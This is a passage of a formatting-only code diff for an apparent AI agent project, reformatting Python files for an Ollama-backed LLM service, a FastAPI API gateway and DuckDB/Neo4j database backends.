\n+\n     try:\n         # Initialize Ollama client with custom host\n         OLLAMA_CLIENT = ollama.Client(host=OLLAMA_HOST)\n-        \n+\n         # Check if model is available\n         try:\n             models = OLLAMA_CLIENT.list()\n-            available_models = [model['name'] for model in models['models']]\n-            \n+            available_models = [model[\"name\"] for model in models[\"models\"]]\n+\n             if MODEL_NAME not in available_models:\n-                logger.warning(f\"Model {MODEL_NAME} not found. Available models: {available_models}\")\n+                logger.warning(\n+                    f\"Model {MODEL_NAME} not found. Available models: {available_models}\"\n+                )\n                 # Try to pull the model\n                 logger.info(f\"Attempting to pull model: {MODEL_NAME}\")\n                 OLLAMA_CLIENT.pull(MODEL_NAME)\n                 logger.info(f\"Successfully pulled model: {MODEL_NAME}\")\n-                \n+\n         except Exception as e:\n             logger.warning(f\"Could not check/pull model: {e}\")\n-        \n+\n         logger.info(\"LLM service initialized successfully\")\n-        \n+\n     except Exception as e:\n         logger.error(f\"Failed to initialize LLM service: {e}\")\n         raise\n \n \n # Initialize FastAPI app\n app = FastAPI(\n     title=\"Agent CAG LLM Service\",\n     description=\"Large Language Model text generation service\",\n-    version=\"1.0.0\"\n+    version=\"1.0.0\",\n )\n \n \n @app.on_event(\"startup\")\n async def startup_event():\n     \"\"\"Initialize the service.\"\"\"\n     logger.info(\"Starting LLM Service...\")\n-    \n+\n     # Initialize LLM\n     initialize_llm()\n-    \n+\n     # Start Prometheus metrics server if enabled\n     if os.getenv(\"METRICS_ENABLED\", \"false\").lower() == \"true\":\n         start_http_server(8082)\n         logger.info(\"Prometheus metrics server started on port 8082\")\n-    \n+\n     logger.info(\"LLM Service started successfully\")\n \n \n @app.get(\"/health\")\n async def health_check():\n     \"\"\"Health check endpoint.\"\"\"\n     try:\n         if OLLAMA_CLIENT is None:\n             raise Exception(\"Ollama client not initialized\")\n-        \n+\n         # Test connection to Ollama\n         models = OLLAMA_CLIENT.list()\n-        \n+\n         return {\n             \"status\": \"healthy\",\n             \"service\": \"agent-llm\",\n             \"model\": MODEL_NAME,\n-            \"available_models\": [model['name'] for model in models['models']]\n+            \"available_models\": [model[\"name\"] for model in models[\"models\"]],\n         }\n     except Exception as e:\n         logger.error(f\"Health check failed: {e}\")\n         raise HTTPException(status_code=503, detail=\"Service unhealthy\")\n \n@@ -179,106 +189,100 @@\n @app.post(\"/generate\", response_model=GenerationResponse)\n async def generate_text(request: GenerationRequest):\n     \"\"\"Generate text using the LLM.\"\"\"\n     try:\n         REQUEST_COUNT.inc()\n-        \n+\n         with REQUEST_DURATION.time():\n             # Prepare the prompt\n             if request.system_prompt:\n                 full_prompt = f\"System: {request.system_prompt}\\n\\nUser: {request.text}\\n\\nAssistant:\"\n             else:\n                 full_prompt = request.text\n-            \n+\n             # Generate response using Ollama\n             response = await generate_with_ollama(\n                 prompt=full_prompt,\n                 max_tokens=request.max_tokens,\n                 temperature=request.temperature,\n-                top_p=request.top_p\n+                top_p=request.top_p,\n             )\n-            \n+\n             GENERATION_COUNT.inc()\n             TOKEN_COUNT.inc(response[\"tokens_used\"])\n-            \n+\n             return GenerationResponse(\n                 text=response[\"text\"],\n                 tokens_used=response[\"tokens_used\"],\n                 model=MODEL_NAME,\n-                metadata=response.get(\"metadata\", {})\n+                metadata=response.get(\"metadata\", {}),\n             )\n-            \n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"Text generation failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n \n async def generate_with_ollama(\n-    prompt: str,\n-    max_tokens: int = 1000,\n-    temperature: float = 0.7,\n-    top_p: float = 0.9\n+    prompt: str, max_tokens: int = 1000, temperature: float = 0.7, top_p: float = 0.9\n ) -> Dict[str, Any]:\n     \"\"\"Generate text using Ollama.\"\"\"\n     try:\n         if OLLAMA_CLIENT is None:\n             raise Exception(\"Ollama client not initialized\")\n-        \n+\n         # Generate response\n         response = OLLAMA_CLIENT.generate(\n             model=MODEL_NAME,\n             prompt=prompt,\n             options={\n-                'num_predict': max_tokens,\n-                'temperature': temperature,\n-                'top_p': top_p,\n-                'stop': ['User:', 'Human:', '\\n\\n']\n-            }\n+                \"num_predict\": max_tokens,\n+                \"temperature\": temperature,\n+                \"top_p\": top_p,\n+                \"stop\": [\"User:\", \"Human:\", \"\\n\\n\"],\n+            },\n         )\n-        \n-        generated_text = response['response'].strip()\n-        \n+\n+        generated_text = response[\"response\"].strip()\n+\n         # Estimate token count (rough approximation)\n         tokens_used = len(generated_text.split()) * 1.3  # Rough token estimation\n-        \n+\n         return {\n             \"text\": generated_text,\n             \"tokens_used\": int(tokens_used),\n             \"metadata\": {\n                 \"model\": MODEL_NAME,\n-                \"done\": response.get('done', True),\n-                \"total_duration\": response.get('total_duration', 0),\n-                \"load_duration\": response.get('load_duration', 0),\n-                \"prompt_eval_count\": response.get('prompt_eval_count', 0),\n-                \"eval_count\": response.get('eval_count', 0)\n-            }\n+                \"done\": response.get(\"done\", True),\n+                \"total_duration\": response.get(\"total_duration\", 0),\n+                \"load_duration\": response.get(\"load_duration\", 0),\n+                \"prompt_eval_count\": response.get(\"prompt_eval_count\", 0),\n+                \"eval_count\": response.get(\"eval_count\", 0),\n+            },\n         }\n-        \n+\n     except Exception as e:\n         logger.error(f\"Ollama generation failed: {e}\")\n         # Fallback to a simple response\n         return {\n             \"text\": \"I apologize, but I'm currently unable to process your request. The language model service is experiencing issues.\",\n             \"tokens_used\": 20,\n-            \"metadata\": {\"error\": str(e), \"fallback\": True}\n+            \"metadata\": {\"error\": str(e), \"fallback\": True},\n         }\n \n \n @app.get(\"/models\")\n async def list_models():\n     \"\"\"List available models.\"\"\"\n     try:\n         if OLLAMA_CLIENT is None:\n             raise Exception(\"Ollama client not initialized\")\n-        \n+\n         models = OLLAMA_CLIENT.list()\n-        return {\n-            \"models\": models['models'],\n-            \"current_model\": MODEL_NAME\n-        }\n-        \n+        return {\"models\": models[\"models\"], \"current_model\": MODEL_NAME}\n+\n     except Exception as e:\n         logger.error(f\"Failed to list models: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n \n@@ -286,21 +290,21 @@\n async def chat_completion(request: GenerationRequest):\n     \"\"\"Chat completion endpoint (alternative interface).\"\"\"\n     try:\n         # Use the same generation logic but with chat formatting\n         system_prompt = request.system_prompt or \"You are a helpful AI assistant.\"\n-        \n+\n         chat_request = GenerationRequest(\n             text=request.text,\n             max_tokens=request.max_tokens,\n             temperature=request.temperature,\n             top_p=request.top_p,\n-            system_prompt=system_prompt\n+            system_prompt=system_prompt,\n         )\n-        \n+\n         return await generate_text(chat_request)\n-        \n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"Chat completion failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n@@ -308,20 +312,13 @@\n @app.exception_handler(Exception)\n async def global_exception_handler(request, exc):\n     \"\"\"Global exception handler.\"\"\"\n     ERROR_COUNT.labels(error_type=type(exc).__name__).inc()\n     logger.error(f\"Unhandled exception: {exc}\")\n-    \n-    return {\n-        \"detail\": \"Internal server error\"\n-    }\n+\n+    return {\"detail\": \"Internal server error\"}\n \n \n if __name__ == \"__main__\":\n     import uvicorn\n-    uvicorn.run(\n-        \"main:app\",\n-        host=\"0.0.0.0\",\n-        port=8002,\n-        reload=True,\n-        log_level=\"info\"\n-    )\n\\ No newline at end of file\n+\n+    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8002, reload=True, log_level=\"info\")\n--- /home/pas/source/agent-cag/api/main.py\t2025-06-20 16:13:13.034971+00:00\n+++ /home/pas/source/agent-cag/api/main.py\t2025-06-20 19:24:34.261957+00:00\n@@ -23,41 +23,43 @@\n # Configure logging\n logging.basicConfig(level=logging.INFO)\n logger = logging.getLogger(__name__)\n \n # Prometheus metrics\n-REQUEST_COUNT = Counter('api_requests_total', 'Total API requests', ['method', 'endpoint'])\n-REQUEST_DURATION = Histogram('api_request_duration_seconds', 'Request duration')\n-QUERY_COUNT = Counter('queries_total', 'Total queries processed')\n-ERROR_COUNT = Counter('errors_total', 'Total errors', ['error_type'])\n+REQUEST_COUNT = Counter(\n+    \"api_requests_total\", \"Total API requests\", [\"method\", \"endpoint\"]\n+)\n+REQUEST_DURATION = Histogram(\"api_request_duration_seconds\", \"Request duration\")\n+QUERY_COUNT = Counter(\"queries_total\", \"Total queries processed\")\n+ERROR_COUNT = Counter(\"errors_total\", \"Total errors\", [\"error_type\"])\n \n # Global database manager\n db_manager: Optional[DatabaseManager] = None\n \n \n @asynccontextmanager\n async def lifespan(app: FastAPI):\n     \"\"\"Application lifespan manager.\"\"\"\n     global db_manager\n-    \n+\n     # Startup\n     logger.info(\"Starting Agent CAG API Service...\")\n-    \n+\n     # Initialize database manager\n     deployment_profile = os.getenv(\"DEPLOYMENT_PROFILE\", \"lightweight\")\n     db_manager = DatabaseManager(deployment_profile)\n     await db_manager.initialize()\n-    \n+\n     # Start Prometheus metrics server if enabled\n     if os.getenv(\"METRICS_ENABLED\", \"false\").lower() == \"true\":\n         start_http_server(8080)\n         logger.info(\"Prometheus metrics server started on port 8080\")\n-    \n+\n     logger.info(f\"API Service started with {deployment_profile} profile\")\n-    \n+\n     yield\n-    \n+\n     # Shutdown\n     logger.info(\"Shutting down Agent CAG API Service...\")\n     if db_manager:\n         await db_manager.close()\n \n@@ -65,38 +67,38 @@\n # Initialize FastAPI app\n app = FastAPI(\n     title=\"Agent CAG API\",\n     description=\"Context-Aware Graph AI Agent API\",\n     version=\"1.0.0\",\n-    lifespan=lifespan\n+    lifespan=lifespan,\n )\n \n \n @app.middleware(\"http\")\n async def metrics_middleware(request: Request, call_next):\n     \"\"\"Middleware to collect metrics.\"\"\"\n     REQUEST_COUNT.labels(method=request.method, endpoint=request.url.path).inc()\n-    \n+\n     with REQUEST_DURATION.time():\n         response = await call_next(request)\n-    \n+\n     return response\n \n \n @app.get(\"/health\", response_model=HealthResponse)\n async def health_check():\n     \"\"\"Health check endpoint.\"\"\"\n     try:\n         # Check database connection\n         if db_manager:\n             await db_manager.health_check()\n-        \n+\n         return HealthResponse(\n             status=\"healthy\",\n             service=\"agent-api\",\n             profile=os.getenv(\"DEPLOYMENT_PROFILE\", \"lightweight\"),\n-            version=\"1.0.0\"\n+            version=\"1.0.0\",\n         )\n     except Exception as e:\n         logger.error(f\"Health check failed: {e}\")\n         raise HTTPException(status_code=503, detail=\"Service unhealthy\")\n \n@@ -111,44 +113,43 @@\n async def process_query(request: QueryRequest):\n     \"\"\"Process a user query through the AI pipeline.\"\"\"\n     try:\n         QUERY_COUNT.inc()\n         logger.info(f\"Processing query: {request.text[:100]}...\")\n-        \n+\n         # Store the query in the graph\n         query_id = await db_manager.store_query(\n             text=request.text,\n             user_id=request.user_id or \"anonymous\",\n-            input_type=request.input_type\n-        )\n-        \n+            input_type=request.input_type,\n+        )\n+\n         # Process through LLM service\n         llm_response = await call_llm_service(request.text)\n-        \n+\n         # Store the response\n         response_id = await db_manager.store_response(\n             query_id=query_id,\n             text=llm_response[\"text\"],\n-            metadata=llm_response.get(\"metadata\", {})\n-        )\n-        \n+            metadata=llm_response.get(\"metadata\", {}),\n+        )\n+\n         # Generate speech if requested\n         audio_url = None\n         if request.generate_speech:\n             audio_url = await call_tts_service(\n-                text=llm_response[\"text\"],\n-                use_sardaukar=request.use_sardaukar\n+                text=llm_response[\"text\"], use_sardaukar=request.use_sardaukar\n             )\n-        \n+\n         return QueryResponse(\n             query_id=query_id,\n             response_id=response_id,\n             text=llm_response[\"text\"],\n             audio_url=audio_url,\n-            metadata=llm_response.get(\"metadata\", {})\n-        )\n-        \n+            metadata=llm_response.get(\"metadata\", {}),\n+        )\n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"Query processing failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n@@ -157,20 +158,20 @@\n async def speech_to_text(request: Request):\n     \"\"\"Convert speech to text using ASR service.\"\"\"\n     try:\n         # Forward to ASR service\n         asr_url = os.getenv(\"ASR_SERVICE_URL\", \"http://asr:8001\")\n-        \n+\n         async with httpx.AsyncClient() as client:\n             response = await client.post(\n                 f\"{asr_url}/transcribe\",\n                 content=await request.body(),\n-                headers={\"Content-Type\": request.headers.get(\"Content-Type\")}\n+                headers={\"Content-Type\": request.headers.get(\"Content-Type\")},\n             )\n             response.raise_for_status()\n             return response.json()\n-            \n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"Speech-to-text failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n@@ -179,11 +180,11 @@\n async def get_user_history(user_id: str, limit: int = 10):\n     \"\"\"Get conversation history for a user.\"\"\"\n     try:\n         history = await db_manager.get_user_history(user_id, limit)\n         return {\"user_id\": user_id, \"history\": history}\n-        \n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"History retrieval failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n@@ -192,38 +193,36 @@\n async def search_knowledge(query: str, limit: int = 5):\n     \"\"\"Search the knowledge base using vector similarity.\"\"\"\n     try:\n         results = await db_manager.search_similar(query, limit)\n         return {\"query\": query, \"results\": results}\n-        \n+\n     except Exception as e:\n         ERROR_COUNT.labels(error_type=type(e).__name__).inc()\n         logger.error(f\"Knowledge search failed: {e}\")\n         raise HTTPException(status_code=500, detail=str(e))\n \n \n async def call_llm_service(text: str) -> Dict[str, Any]:\n     \"\"\"Call the LLM service to generate a response.\"\"\"\n     llm_url = os.getenv(\"LLM_SERVICE_URL\", \"http://llm:8002\")\n-    \n+\n     async with httpx.AsyncClient(timeout=60.0) as client:\n         response = await client.post(\n-            f\"{llm_url}/generate\",\n-            json={\"text\": text, \"max_tokens\": 1000}\n+            f\"{llm_url}/generate\", json={\"text\": text, \"max_tokens\": 1000}\n         )\n         response.raise_for_status()\n         return response.json()\n \n \n async def call_tts_service(text: str, use_sardaukar: bool = False) -> str:\n     \"\"\"Call the TTS service to generate speech.\"\"\"\n     tts_url = os.getenv(\"TTS_SERVICE_URL\", \"http://tts:8003\")\n-    \n+\n     async with httpx.AsyncClient(timeout=30.0) as client:\n         response = await client.post(\n-            f\"{tts_url}/synthesize\",\n-            json={\"text\": text, \"use_sardaukar\": use_sardaukar}\n+            f\"{tts_url}/synthesize\", json={\"text\": text, \"use_sardaukar\": use_sardaukar}\n         )\n         response.raise_for_status()\n         result = response.json()\n         return result.get(\"audio_url\")\n \n@@ -231,21 +230,13 @@\n @app.exception_handler(Exception)\n async def global_exception_handler(request: Request, exc: Exception):\n     \"\"\"Global exception handler.\"\"\"\n     ERROR_COUNT.labels(error_type=type(exc).__name__).inc()\n     logger.error(f\"Unhandled exception: {exc}\")\n-    \n-    return JSONResponse(\n-        status_code=500,\n-        content={\"detail\": \"Internal server error\"}\n-    )\n+\n+    return JSONResponse(status_code=500, content={\"detail\": \"Internal server error\"})\n \n \n if __name__ == \"__main__\":\n     import uvicorn\n-    uvicorn.run(\n-        \"main:app\",\n-        host=\"0.0.0.0\",\n-        port=8000,\n-        reload=True,\n-        log_level=\"info\"\n-    )\n\\ No newline at end of file\n+\n+    uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000, reload=True, log_level=\"info\")\n--- /home/pas/source/agent-cag/api/database.py\t2025-06-20 16:14:39.902345+00:00\n+++ /home/pas/source/agent-cag/api/database.py\t2025-06-20 19:24:34.302824+00:00\n@@ -18,428 +18,479 @@\n logger = logging.getLogger(__name__)\n \n \n class DatabaseBackend(ABC):\n     \"\"\"Abstract base class for database backends.\"\"\"\n-    \n+\n     @abstractmethod\n     async def initialize(self):\n         \"\"\"Initialize the database backend.\"\"\"\n         pass\n-    \n+\n     @abstractmethod\n     async def close(self):\n         \"\"\"Close database connections.\"\"\"\n         pass\n-    \n+\n     @abstractmethod\n     async def health_check(self):\n         \"\"\"Check database health.\"\"\"\n         pass\n-    \n+\n     @abstractmethod\n     async def store_query(self, text: str, user_id: str, input_type: str) -> str:\n         \"\"\"Store a user query and return query ID.\"\"\"\n         pass\n-    \n-    @abstractmethod\n-    async def store_response(self, query_id: str, text: str, metadata: Dict[str, Any]) -> str:\n+\n+    @abstractmethod\n+    async def store_response(\n+        self, query_id: str, text: str, metadata: Dict[str, Any]\n+    ) -> str:\n         \"\"\"Store a response and return response ID.\"\"\"\n         pass\n-    \n-    @abstractmethod\n-    async def get_user_history(self, user_id: str, limit: int) -> List[ConversationEntry]:\n+\n+    @abstractmethod\n+    async def get_user_history(\n+        self, user_id: str, limit: int\n+    ) -> List[ConversationEntry]:\n         \"\"\"Get conversation history for a user.\"\"\"\n         pass\n-    \n+\n     @abstractmethod\n     async def search_similar(self, query: str, limit: int) -> List[SearchResult]:\n         \"\"\"Search for similar content.\"\"\"\n         pass\n \n \n class DuckDBBackend(DatabaseBackend):\n     \"\"\"DuckDB-based lightweight backend.\"\"\"\n-    \n+\n     def __init__(self, db_path: str = \"/app/data/agent.db\"):\n         self.db_path = db_path\n         self.conn = None\n-    \n+\n     async def initialize(self):\n         \"\"\"Initialize DuckDB database.\"\"\"\n         logger.info(f\"Initializing DuckDB backend at {self.db_path}\")\n-        \n+\n         # Ensure data directory exists\n         os.makedirs(os.path.dirname(self.db_path), exist_ok=True)\n-        \n+\n         # Connect to DuckDB\n         self.conn = duckdb.connect(self.db_path)\n-        \n+\n         # Create tables\n         await self._create_tables()\n-        \n+\n         logger.info(\"DuckDB backend initialized successfully\")\n-    \n+\n     async def _create_tables(self):\n         \"\"\"Create necessary tables.\"\"\"\n         # Users table\n-        self.conn.execute(\"\"\"\n+        self.conn.execute(\n+            \"\"\"\n             CREATE TABLE IF NOT EXISTS users (\n                 id VARCHAR PRIMARY KEY,\n                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n             )\n-        \"\"\")\n-        \n+        \"\"\"\n+        )\n+\n         # Queries table\n-        self.conn.execute(\"\"\"\n+        self.conn.execute(\n+            \"\"\"\n             CREATE TABLE IF NOT EXISTS queries (\n                 id VARCHAR PRIMARY KEY,\n                 user_id VARCHAR,\n                 text TEXT,\n                 input_type VARCHAR,\n                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                 FOREIGN KEY (user_id) REFERENCES users(id)\n             )\n-        \"\"\")\n-        \n+        \"\"\"\n+        )\n+\n         # Responses table\n-        self.conn.execute(\"\"\"\n+        self.conn.execute(\n+            \"\"\"\n             CREATE TABLE IF NOT EXISTS responses (\n                 id VARCHAR PRIMARY KEY,\n                 query_id VARCHAR,\n                 text TEXT,\n                 metadata JSON,\n                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n                 FOREIGN KEY (query_id) REFERENCES queries(id)\n             )\n-        \"\"\")\n-        \n+        \"\"\"\n+        )\n+\n         # Embeddings table for vector search\n-        self.conn.execute(\"\"\"\n+        self.conn.execute(\n+            \"\"\"\n             CREATE TABLE IF NOT EXISTS embeddings (\n                 id VARCHAR PRIMARY KEY,\n                 content_id VARCHAR,\n                 content_type VARCHAR,\n                 text TEXT,\n                 embedding FLOAT[],\n                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n             )\n-        \"\"\")\n-        \n+        \"\"\"\n+        )\n+\n         # Graph relationships table\n-        self.conn.execute(\"\"\"\n+        self.conn.execute(\n+            \"\"\"\n             CREATE TABLE IF NOT EXISTS relationships (\n                 id VARCHAR PRIMARY KEY,\n                 source_id VARCHAR,\n                 target_id VARCHAR,\n                 relationship_type VARCHAR,\n                 properties JSON,\n                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n             )\n-        \"\"\")\n-    \n+        \"\"\"\n+        )\n+\n     async def close(self):\n         \"\"\"Close DuckDB connection.\"\"\"\n         if self.conn:\n             self.conn.close()\n             logger.info(\"DuckDB connection closed\")\n-    \n+\n     async def health_check(self):\n         \"\"\"Check DuckDB health.\"\"\"\n         if not self.conn:\n             raise Exception(\"Database not initialized\")\n-        \n+\n         # Simple query to check connection\n         result = self.conn.execute(\"SELECT 1\").fetchone()\n         if result[0] != 1:\n             raise Exception(\"Database health check failed\")\n-    \n+\n     async def store_query(self, text: str, user_id: str, input_type: str) -> str:\n         \"\"\"Store a user query.\"\"\"\n         query_id = str(uuid.uuid4())\n-        \n+\n         # Ensure user exists\n-        self.conn.execute(\n-            \"INSERT OR IGNORE INTO users (id) VALUES (?)\",\n-            [user_id]\n-        )\n-        \n+        self.conn.execute(\"INSERT OR IGNORE INTO users (id) VALUES (?)\", [user_id])\n+\n         # Store query\n         self.conn.execute(\n             \"INSERT INTO queries (id, user_id, text, input_type) VALUES (?, ?, ?, ?)\",\n-            [query_id, user_id, text, input_type]\n-        )\n-        \n+            [query_id, user_id, text, input_type],\n+        )\n+\n         logger.info(f\"Stored query {query_id} for user {user_id}\")\n         return query_id\n-    \n-    async def store_response(self, query_id: str, text: str, metadata: Dict[str, Any]) -> str:\n+\n+    async def store_response(\n+        self, query_id: str, text: str, metadata: Dict[str, Any]\n+    ) -> str:\n         \"\"\"Store a response.\"\"\"\n         response_id = str(uuid.uuid4())\n-        \n+\n         self.conn.execute(\n             \"INSERT INTO responses (id, query_id, text, metadata) VALUES (?, ?, ?, ?)\",\n-            [response_id, query_id, text, json.dumps(metadata)]\n-        )\n-        \n+            [response_id, query_id, text, json.dumps(metadata)],\n+        )\n+\n         # Create relationships\n         await self._create_relationships(query_id, response_id, text)\n-        \n+\n         logger.info(f\"Stored response {response_id} for query {query_id}\")\n         return response_id\n-    \n-    async def _create_relationships(self, query_id: str, response_id: str, response_text: str):\n+\n+    async def _create_relationships(\n+        self, query_id: str, response_id: str, response_text: str\n+    ):\n         \"\"\"Create graph relationships.\"\"\"\n         # Query -> Response relationship\n         rel_id = str(uuid.uuid4())\n         self.conn.execute(\n             \"INSERT INTO relationships (id, source_id, target_id, relationship_type) VALUES (?, ?, ?, ?)\",\n-            [rel_id, query_id, response_id, \"ANSWERS\"]\n-        )\n-    \n-    async def get_user_history(self, user_id: str, limit: int) -> List[ConversationEntry]:\n+            [rel_id, query_id, response_id, \"ANSWERS\"],\n+        )\n+\n+    async def get_user_history(\n+        self, user_id: str, limit: int\n+    ) -> List[ConversationEntry]:\n         \"\"\"Get conversation history for a user.\"\"\"\n-        result = self.conn.execute(\"\"\"\n+        result = self.conn.execute(\n+            \"\"\"\n             SELECT q.id, r.id, q.text, r.text, q.created_at, q.input_type\n             FROM queries q\n             JOIN responses r ON q.id = r.query_id\n             WHERE q.user_id = ?\n             ORDER BY q.created_at DESC\n             LIMIT ?\n-        \"\"\", [user_id, limit]).fetchall()\n-        \n+        \"\"\",\n+            [user_id, limit],\n+        ).fetchall()\n+\n         history = []\n         for row in result:\n-            history.append(ConversationEntry(\n-                query_id=row[0],\n-                response_id=row[1],\n-                query_text=row[2],\n-                response_text=row[3],\n-                timestamp=row[4].isoformat(),\n-                input_type=row[5]\n-            ))\n-        \n+            history.append(\n+                ConversationEntry(\n+                    query_id=row[0],\n+                    response_id=row[1],\n+                    query_text=row[2],\n+                    response_text=row[3],\n+                    timestamp=row[4].isoformat(),\n+                    input_type=row[5],\n+                )\n+            )\n+\n         return history\n-    \n+\n     async def search_similar(self, query: str, limit: int) -> List[SearchResult]:\n         \"\"\"Search for similar content using simple text matching.\"\"\"\n         # Simple text search implementation\n         # In a real implementation, you would use vector embeddings\n-        result = self.conn.execute(\"\"\"\n+        result = self.conn.execute(\n+            \"\"\"\n             SELECT r.id, r.text, 1.0 as score\n             FROM responses r\n             WHERE r.text LIKE ?\n             ORDER BY score DESC\n             LIMIT ?\n-        \"\"\", [f\"%{query}%\", limit]).fetchall()\n-        \n+        \"\"\",\n+            [f\"%{query}%\", limit],\n+        ).fetchall()\n+\n         results = []\n         for row in result:\n-            results.append(SearchResult(\n-                id=row[0],\n-                text=row[1],\n-                score=row[2]\n-            ))\n-        \n+            results.append(SearchResult(id=row[0], text=row[1], score=row[2]))\n+\n         return results\n \n \n class FullStackBackend(DatabaseBackend):\n     \"\"\"Full stack backend using ChromaDB and Neo4j.\"\"\"\n-    \n+\n     def __init__(self):\n         self.chroma_client = None\n         self.neo4j_driver = None\n-    \n+\n     async def initialize(self):\n         \"\"\"Initialize ChromaDB and Neo4j connections.\"\"\"\n         logger.info(\"Initializing full stack backend...\")\n-        \n+\n         try:\n             # Initialize ChromaDB\n             import chromadb\n+\n             chroma_host = os.getenv(\"CHROMA_HOST\", \"chroma\")\n             chroma_port = int(os.getenv(\"CHROMA_PORT\", \"8005\"))\n-            self.chroma_client = chromadb.HttpClient(\n-                host=chroma_host,\n-                port=chroma_port\n-            )\n-            \n+            self.chroma_client = chromadb.HttpClient(host=chroma_host, port=chroma_port)\n+\n             # Initialize Neo4j\n             from neo4j import GraphDatabase\n+\n             neo4j_uri = os.getenv(\"NEO4J_URI\", \"bolt://neo4j:7687\")\n             neo4j_user = os.getenv(\"NEO4J_USER\", \"neo4j\")\n             neo4j_password = os.getenv(\"NEO4J_PASSWORD\", \"password\")\n-            \n+\n             self.neo4j_driver = GraphDatabase.driver(\n-                neo4j_uri,\n-                auth=(neo4j_user, neo4j_password)\n-            )\n-            \n+                neo4j_uri, auth=(neo4j_user, neo4j_password)\n+            )\n+\n             # Create collections and constraints\n             await self._setup_databases()\n-            \n+\n             logger.info(\"Full stack backend initialized successfully\")\n-            \n+\n         except ImportError as e:\n             logger.error(f\"Missing dependencies for full stack backend: {e}\")\n             raise\n         except Exception as e:\n             logger.error(f\"Failed to initialize full stack backend: {e}\")\n             raise\n-    \n+\n     async def _setup_databases(self):\n         \"\"\"Setup ChromaDB collections and Neo4j constraints.\"\"\"\n         # Create ChromaDB collection\n         try:\n             self.chroma_client.create_collection(\"agent_embeddings\")\n         except Exception:\n             # Collection might already exist\n             pass\n-        \n+\n         # Create Neo4j constraints\n         with self.neo4j_driver.session() as session:\n-            session.run(\"CREATE CONSTRAINT IF NOT EXISTS FOR (q:Query) REQUIRE q.id IS UNIQUE\")\n-            session.run(\"CREATE CONSTRAINT IF NOT EXISTS FOR (r:Response) REQUIRE r.id IS UNIQUE\")\n-            session.run(\"CREATE CONSTRAINT IF NOT EXISTS FOR (u:User) REQUIRE u.id IS UNIQUE\")\n-    \n+            session.run(\n+                \"CREATE CONSTRAINT IF NOT EXISTS FOR (q:Query) REQUIRE q.id IS UNIQUE\"\n+            )\n+            session.run(\n+                \"CREATE CONSTRAINT IF NOT EXISTS FOR (r:Response) REQUIRE r.id IS UNIQUE\"\n+            )\n+            session.run(\n+                \"CREATE CONSTRAINT IF NOT EXISTS FOR (u:User) REQUIRE u.id IS UNIQUE\"\n+            )\n+\n     async def close(self):\n         \"\"\"Close database connections.\"\"\"\n         if self.neo4j_driver:\n             self.neo4j_driver.close()\n             logger.info(\"Neo4j connection closed\")\n-    \n+\n     async def health_check(self):\n         \"\"\"Check database health.\"\"\"\n         # Check ChromaDB\n         if not self.chroma_client:\n             raise Exception(\"ChromaDB not initialized\")\n-        \n+\n         # Check Neo4j\n         if not self.neo4j_driver:\n             raise Exception(\"Neo4j not initialized\")\n-        \n+\n         with self.neo4j_driver.session() as session:\n             result = session.run(\"RETURN 1\")\n             if not result.single()[0] == 1:\n                 raise Exception(\"Neo4j health check failed\")\n-    \n+\n     async def store_query(self, text: str, user_id: str, input_type: str) -> str:\n         \"\"\"Store a user query in Neo4j.\"\"\"\n         query_id = str(uuid.uuid4())\n-        \n+\n         with self.neo4j_driver.session() as session:\n-            session.run(\"\"\"\n+            session.run(\n+                \"\"\"\n                 MERGE (u:User {id: $user_id})\n                 CREATE (q:Query {\n                     id: $query_id,\n                     text: $text,\n                     input_type: $input_type,\n                     created_at: datetime()\n                 })\n                 CREATE (u)-[:ASKED]->(q)\n-            \"\"\", user_id=user_id, query_id=query_id, text=text, input_type=input_type)\n-        \n+            \"\"\",\n+                user_id=user_id,\n+                query_id=query_id,\n+                text=text,\n+                input_type=input_type,\n+            )\n+\n         return query_id\n-    \n-    async def store_response(self, query_id: str, text: str, metadata: Dict[str, Any]) -> str:\n+\n+    async def store_response(\n+        self, query_id: str, text: str, metadata: Dict[str, Any]\n+    ) -> str:\n         \"\"\"Store a response in Neo4j.\"\"\"\n         response_id = str(uuid.uuid4())\n-        \n+\n         with self.neo4j_driver.session() as session:\n-            session.run(\"\"\"\n+            session.run(\n+                \"\"\"\n                 MATCH (q:Query {id: $query_id})\n                 CREATE (r:Response {\n                     id: $response_id,\n                     text: $text,\n                     metadata: $metadata,\n                     created_at: datetime()\n                 })\n                 CREATE (r)-[:ANSWERS]->(q)\n-            \"\"\", query_id=query_id, response_id=response_id, text=text, metadata=json.dumps(metadata))\n-        \n+            \"\"\",\n+                query_id=query_id,\n+                response_id=response_id,\n+                text=text,\n+                metadata=json.dumps(metadata),\n+            )\n+\n         return response_id\n-    \n-    async def get_user_history(self, user_id: str, limit: int) -> List[ConversationEntry]:\n+\n+    async def get_user_history(\n+        self, user_id: str, limit: int\n+    ) -> List[ConversationEntry]:\n         \"\"\"Get conversation history from Neo4j.\"\"\"\n         with self.neo4j_driver.session() as session:\n-            result = session.run(\"\"\"\n+            result = session.run(\n+                \"\"\"\n                 MATCH (u:User {id: $user_id})-[:ASKED]->(q:Query)<-[:ANSWERS]-(r:Response)\n                 RETURN q.id, r.id, q.text, r.text, q.created_at, q.input_type\n                 ORDER BY q.created_at DESC\n                 LIMIT $limit\n-            \"\"\", user_id=user_id, limit=limit)\n-            \n+            \"\"\",\n+                user_id=user_id,\n+                limit=limit,\n+            )\n+\n             history = []\n             for record in result:\n-                history.append(ConversationEntry(\n-                    